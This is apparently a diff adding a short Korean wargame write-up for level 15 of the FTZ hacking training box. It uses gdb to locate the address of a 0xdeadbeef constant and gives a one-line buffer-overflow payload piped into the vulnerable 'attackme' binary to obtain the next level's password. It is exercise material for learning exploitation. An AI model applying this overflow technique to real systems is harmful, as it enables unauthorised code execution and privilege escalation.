@@ -1,0 +1,30 @@
+level 15
+
+이문제도 level 14와 똑같다.
+
+다만 포인터 변수를 통해 넣어주는것이 포인트이다.
+
+
+따라서 level 14와 동일한 식에
+
+deadbeef 부분만 포인터주소형식으로 바꾸어주기만 하면된다.
+
+
+즉 gdb 로 디어셈블을해서 deadbeef부분을 찾아주면된다.
+
+ex)
+
+[level15@ftz level15]$ gdb -q attackme
+(gdb) x/x 0x080484b0
+0x80484b0 <main+32>:    0xbeef3881
+(gdb) x/x 0x080484b1
+0x80484b1 <main+33>:    0xadbeef38
+(gdb) x/x 0x080484b2
+0x80484b2 <main+34>:   @@0xdeadbeef@@
+
+이처럼 찾아주면 된다 즉 주소는 0x80484b2 이므로 식을 세우면
+
+(python -c 'print "\x90"*40+"\xb2\x84\x04\x08"';cat)|./attackme 가되므로
+
+my-pass를 입력하면 답이나온다.
+
